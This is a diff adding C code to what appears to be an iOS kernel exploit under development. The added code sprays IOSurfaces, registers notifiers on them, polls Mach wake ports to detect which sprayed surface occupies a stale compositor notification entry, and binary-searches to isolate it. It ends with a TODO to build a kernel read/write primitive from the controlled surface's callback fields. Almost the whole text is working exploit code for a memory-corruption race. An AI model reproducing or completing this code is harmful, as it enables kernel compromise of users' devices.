@@ -19710,6 +19710,217 @@ new_modes:
                 rlog("  r=229: SURVIVED Phase 13 attempt #%d! spray=%d frames=%d wps=%d phase=%d\n",
                     r229_attempt, r229_spray_n, p13_render_frames, r229_wp_n, r229_phase);
 
+                /* === IOSurfaceNotifier: populate kernel callback fields (+0x108/+0x110) ===
+                 * Without callbacks, the compositor inner_method returns 0 and no
+                 * notification fires even when MTE matches. Creating notifiers MAY
+                 * populate the kernel-side callback array, making wake port detection
+                 * work for matched spray surfaces.
+                 */
+                typedef CFTypeRef (*IOSurfaceNotifierCreate_t)(IOSurfaceRef, void *, void *);
+                typedef void (*IOSurfaceNotifierSetDispatchQueue_t)(CFTypeRef, dispatch_queue_t);
+                typedef void (*IOSurfaceNotifierInvalidate_t)(CFTypeRef);
+                IOSurfaceNotifierCreate_t notifier_create_fn =
+                    (IOSurfaceNotifierCreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceNotifierCreate");
+                IOSurfaceNotifierSetDispatchQueue_t notifier_setq_fn =
+                    (IOSurfaceNotifierSetDispatchQueue_t)dlsym(RTLD_DEFAULT, "IOSurfaceNotifierSetDispatchQueue");
+                IOSurfaceNotifierInvalidate_t notifier_invalidate_fn =
+                    (IOSurfaceNotifierInvalidate_t)dlsym(RTLD_DEFAULT, "IOSurfaceNotifierInvalidate");
+
+                CFTypeRef r229_notifiers[256];
+                int r229_notifier_count = 0;
+                memset(r229_notifiers, 0, sizeof(r229_notifiers));
+
+                if (notifier_create_fn) {
+                    dispatch_queue_t nq = dispatch_queue_create("com.research.notifier", DISPATCH_QUEUE_SERIAL);
+                    for (int si = 0; si < 256; si++) {
+                        if (r229_spray[si]) {
+                            CFTypeRef notif = notifier_create_fn(r229_spray[si], NULL, NULL);
+                            if (notif) {
+                                r229_notifiers[si] = notif;
+                                r229_notifier_count++;
+                                if (notifier_setq_fn && nq) {
+                                    notifier_setq_fn(notif, nq);
+                                }
+                            }
+                        }
+                    }
+                    rlog("  r=229: Created %d IOSurfaceNotifiers (fn=%p setq=%p inv=%p)\n",
+                        r229_notifier_count, (void *)notifier_create_fn,
+                        (void *)notifier_setq_fn, (void *)notifier_invalidate_fn);
+
+                    /* Wait for a few compositor frames to trigger notification dispatch */
+                    usleep(200000);
+
+                    /* Scan ALL wake ports for messages — if any fire, notifier worked */
+                    int r229_wp_hits = 0;
+                    int r229_wp_first_hit = -1;
+                    for (int wi = 0; wi < r229_wp_n; wi++) {
+                        if (!r229_wps[wi]) continue;
+                        uint8_t msg_buf[256];
+                        mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                        memset(msg_buf, 0, sizeof(msg_buf));
+                        hdr->msgh_size = sizeof(msg_buf);
+                        hdr->msgh_local_port = r229_wps[wi];
+                        kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                            0, sizeof(msg_buf), r229_wps[wi], 5, MACH_PORT_NULL);
+                        if (mr == MACH_MSG_SUCCESS) {
+                            r229_wp_hits++;
+                            if (r229_wp_first_hit < 0) r229_wp_first_hit = wi;
+                        }
+                    }
+                    rlog("  r=229: Wake port scan: %d/%d ports fired (first=%d)\n",
+                        r229_wp_hits, r229_wp_n, r229_wp_first_hit);
+
+                    if (r229_wp_hits > 0) {
+                        rlog("  !!! r=229: NOTIFIER WAKE PORT DETECTION WORKS !!!\n");
+                        rlog("  !!! Race won + MTE matched + compositor triggered !!!\n");
+
+                        /* Non-destructive binary search using notifier invalidation:
+                         * Invalidate notifiers for half the spray; if wake port
+                         * stops firing, match was in invalidated half.
+                         */
+                        int nb_lo = 0, nb_hi = 255;
+                        int nb_found = 0;
+                        while (nb_lo < nb_hi) {
+                            int nb_mid = (nb_lo + nb_hi) / 2;
+                            /* Invalidate notifiers for [nb_lo..nb_mid] */
+                            for (int si = nb_lo; si <= nb_mid; si++) {
+                                if (r229_notifiers[si] && notifier_invalidate_fn) {
+                                    notifier_invalidate_fn(r229_notifiers[si]);
+                                    CFRelease(r229_notifiers[si]);
+                                    r229_notifiers[si] = NULL;
+                                }
+                            }
+                            usleep(100000); /* Wait for compositor cycle */
+
+                            /* Re-scan wake ports */
+                            int nb_hits = 0;
+                            for (int wi = 0; wi < r229_wp_n; wi++) {
+                                if (!r229_wps[wi]) continue;
+                                uint8_t mb[256];
+                                mach_msg_header_t *mh = (mach_msg_header_t *)mb;
+                                memset(mb, 0, sizeof(mb));
+                                mh->msgh_size = sizeof(mb);
+                                mh->msgh_local_port = r229_wps[wi];
+                                kern_return_t mr2 = mach_msg(mh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                    0, sizeof(mb), r229_wps[wi], 5, MACH_PORT_NULL);
+                                if (mr2 == MACH_MSG_SUCCESS) nb_hits++;
+                            }
+                            rlog("  r=229: NB search [%d,%d] inv [%d,%d] → hits=%d\n",
+                                nb_lo, nb_hi, nb_lo, nb_mid, nb_hits);
+
+                            if (nb_hits > 0) {
+                                /* Still firing → match NOT in invalidated half */
+                                nb_lo = nb_mid + 1;
+                            } else {
+                                /* Stopped → match WAS in invalidated half.
+                                 * Re-create notifier to confirm and narrow further.
+                                 * Actually, we already invalidated [nb_lo..nb_mid],
+                                 * so the match is in that range. But we destroyed those
+                                 * notifiers. We need a different approach for the lower half.
+                                 *
+                                 * Better: restore the notifiers we removed and invalidate
+                                 * the other half instead. For now, record that match is in
+                                 * [nb_lo, nb_mid] and do a fresh search there.
+                                 */
+                                nb_hi = nb_mid;
+                                /* Re-create notifiers for [nb_lo..nb_hi] */
+                                for (int si = nb_lo; si <= nb_hi; si++) {
+                                    if (r229_spray[si] && !r229_notifiers[si] && notifier_create_fn) {
+                                        CFTypeRef notif = notifier_create_fn(r229_spray[si], NULL, NULL);
+                                        if (notif) {
+                                            r229_notifiers[si] = notif;
+                                            if (notifier_setq_fn && nq) {
+                                                notifier_setq_fn(notif, nq);
+                                            }
+                                        }
+                                    }
+                                }
+                                usleep(100000);
+                            }
+                        }
+                        /* nb_lo == nb_hi: converged */
+                        if (r229_spray[nb_lo]) {
+                            rlog("\n  ========================================\n");
+                            rlog("  === NOTIFIER-BASED MATCH: spray[%d] id=%u ===\n",
+                                nb_lo, IOSurfaceGetID(r229_spray[nb_lo]));
+                            rlog("  ========================================\n");
+                            nb_found = 1;
+
+                            /* Clean up notifiers */
+                            for (int si = 0; si < 256; si++) {
+                                if (r229_notifiers[si]) {
+                                    if (notifier_invalidate_fn) notifier_invalidate_fn(r229_notifiers[si]);
+                                    CFRelease(r229_notifiers[si]);
+                                    r229_notifiers[si] = NULL;
+                                }
+                            }
+
+                            /* Keep matched surface, free others */
+                            for (int si = 0; si < 256; si++) {
+                                if (si == nb_lo) continue;
+                                if (r229_spray[si]) {
+                                    CFRelease(r229_spray[si]);
+                                    r229_spray[si] = NULL;
+                                }
+                            }
+                            for (int wi = 0; wi < r229_wp_n; wi++) {
+                                if (r229_wps[wi]) mach_port_deallocate(mach_task_self(), r229_wps[wi]);
+                            }
+                            r229_wp_n = 0;
+
+                            /* Reset state file */
+                            {
+                                char sp[512];
+                                snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
+                                    getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                                int zero = 0, one = 1;
+                                int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                                if (sfd >= 0) {
+                                    write(sfd, &r229_attempt, sizeof(int));
+                                    write(sfd, &zero, sizeof(int));
+                                    write(sfd, &one, sizeof(int));
+                                    write(sfd, &zero, sizeof(int));
+                                    write(sfd, &zero, sizeof(int));
+                                    write(sfd, &zero, sizeof(int));
+                                    fsync(sfd);
+                                    close(sfd);
+                                }
+                                sync();
+                            }
+
+                            rlog("  r=229: Matched surface kept alive. Proceeding to Phase 14...\n");
+                            /* TODO: Phase 14 — kernel R/W primitive.
+                             * NOW we have a confirmed matched surface that the compositor
+                             * is accessing through the stale notification entry.
+                             * The compositor reads surface+0xD8 (lock) and
+                             * surface+0x108/+0x110 (callbacks) each frame.
+                             * We control this surface from userspace.
+                             */
+
+                            if (r229_sp) { CFRelease(r229_sp); r229_sp = NULL; }
+                            p13_render_run = 0;
+                            pthread_join(render_th, NULL);
+                            p13_free_groom();
+                            if (p13_groom_conn) { IOServiceClose(p13_groom_conn); p13_groom_conn = IO_OBJECT_NULL; }
+                            IOObjectRelease(svc13);
+                            goto phase13_complete;
+                        }
+                    }
+
+                    /* Clean up all notifiers if no match found via wake port */
+                    for (int si = 0; si < 256; si++) {
+                        if (r229_notifiers[si]) {
+                            if (notifier_invalidate_fn) notifier_invalidate_fn(r229_notifiers[si]);
+                            CFRelease(r229_notifiers[si]);
+                            r229_notifiers[si] = NULL;
+                        }
+                    }
+                    if (nq) dispatch_release(nq);
+                } else {
+                    rlog("  r=229: IOSurfaceNotifierCreate not found — falling back to binary search\n");
+                }
+
                 /* Snapshot spray surface IDs */
                 IOSurfaceID r229_ids[256];
                 for (int si = 0; si < 256; si++) {
@@ -19938,6 +20149,7 @@ new_modes:
             if (p13_groom_conn) { IOServiceClose(p13_groom_conn); p13_groom_conn = IO_OBJECT_NULL; }
             IOObjectRelease(svc13);
         }
+        phase13_complete: ;
         phase13_done:
         rlog("--- Phase 13 complete ---\n");
 
